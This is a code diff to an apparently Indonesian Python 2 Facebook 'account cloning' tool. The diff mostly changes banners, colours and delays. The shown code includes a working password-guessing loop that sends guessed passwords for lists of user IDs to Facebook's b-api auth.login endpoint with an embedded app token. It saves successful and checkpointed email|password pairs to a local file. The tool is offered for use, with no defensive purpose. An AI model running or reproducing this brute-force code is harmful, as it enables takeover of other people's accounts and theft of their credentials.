@@ -103,19 +103,37 @@ logo='''
 \033[1;97m➣ GitHub   : https://github.com/anggaxd
 \033[1;97m➣ YouTube  : ANGGA KURNIAWAN
 \033[1;97m--------------------------------------------------
-                                '''
+                                '''                                
+logo2='''
+
+\033[1;97m░█████╗░░░░░░░░█████╗░██╗░░░░░██╗░░░░░
+\033[1;97m██╔══██╗░░░░░░██╔══██╗██║░░░░░██║░░░░░
+\033[1;97m██║░░╚═╝█████╗███████║██║░░░░░██║░░░░░
+\033[1;97m██║░░██╗╚════╝██╔══██║██║░░░░░██║░░░░░
+\033[1;97m╚█████╔╝░░░░░░██║░░██║███████╗███████╗
+\033[1;97m░╚════╝░░░░░░░╚═╝░░╚═╝╚══════╝╚══════╝
+\033[1;97m--------------------------------------------------
+\033[1;97m  Author   : Angga Kurniawan
+\033[1;97m  Version  : 5.1.0
+\033[1;97m  GitHub   : https://github.com/anggaxd
+\033[1;97m  YouTube  : ANGGA KURNIAWAN
+\033[1;93m  * Notice\033[1;97m : Hargai Pembuatnya Jangan Ganti Author Nya
+\033[1;97m--------------------------------------------------
+                           '''
+                           
 CorrectUsername = "anggaxd"
 CorrectPassword = "c-all"
 
 os.system('clear')
-print logo
+print logo2
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;97m➣ Username Tools : ")
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m➣ Password Tools : ")
         if (password == CorrectPassword):
-            print "[✓] Logged in successfully as \n " + username
+            print "\033[1;92m[✓] Logged in successfully as " + username
+            time.sleep(0.5)
             loop = 'false'
         else:
             print "Wrong Password"
@@ -139,7 +157,7 @@ def menu():
 	action()
 
 def action():
-    peak = raw_input('\n\033[1;97mChoose an Option:\033[1;97m')
+    peak = raw_input('\n\033[1;97mChoose an Option : \033[1;97m')
     if peak =='':
         print '[!] Fill In Correctly'
         action()
@@ -195,9 +213,13 @@ def action():
         action()
     xxx = str(len(id))
     print('[✓] Total Numbers: '+xxx)
+    time.sleep(0.5)
     print('[✓] Cloning Process Has Been Started') 
+    time.sleep(0.5)
     print("[✓] Trying Passwords Wait...")
+    time.sleep(0.5)
     print('[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
     print "\033[1;97m--------------------------------------------------"
     def main(arg):
         global cpb,oks
@@ -211,14 +233,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;97m[Successfully]  ' + k + c + user + '  |  ' + pass1
+				print '\033[1;97m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user + '  |  ' + pass1
 				okb = open('anggaxd/clone.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass1
+					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass1
 					cps = open('anggaxd/clone.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -228,14 +250,14 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;97m[Successfully]  ' + k + c + user +  '  |  ' + pass2
+ 				        print '\033[1;97m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user +  '  |  ' + pass2
  				        okb = open('anggaxd/clone.txt', 'a')
  				        okb.write(k+c+user+'|'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass2
+ 					        print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass2
  					        cps = open('anggaxd/clone.txt', 'a')
  					        cps.write(k+c+user+'|'+pass2+'\n')
  					        cps.close()
@@ -251,7 +273,8 @@ def action():
     print '[✓] Process Has Been Completed ...'
     print '[✓] Total Successfully/Checkpoint : '+str(len(oks))+'/'+str(len(cpb))
     print('[✓] Cloned Accounts Has Been Saved : anggaxd/clone.txt')
-    raw_input("\n\033[1;97m[\033[1;97mBack\033[1;95m]")
+    
+    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;95m]")
     menu() 
           
 if __name__ == '__main__':
